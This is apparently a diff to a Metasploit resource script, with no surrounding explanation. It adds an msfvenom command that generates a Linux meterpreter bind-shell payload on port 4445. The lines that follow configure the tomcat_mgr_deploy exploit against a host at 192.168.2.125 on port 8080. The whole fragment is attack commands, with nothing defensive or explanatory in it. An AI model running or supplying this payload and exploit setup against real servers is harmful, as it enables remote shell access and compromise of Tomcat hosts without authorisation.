@@ -1,4 +1,6 @@
 
+msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=4445 -f elf -o /root/a
+
 use exploit/multi/http/tomcat_mgr_deploy
 set rhost 192.168.2.125
 set rport 8080
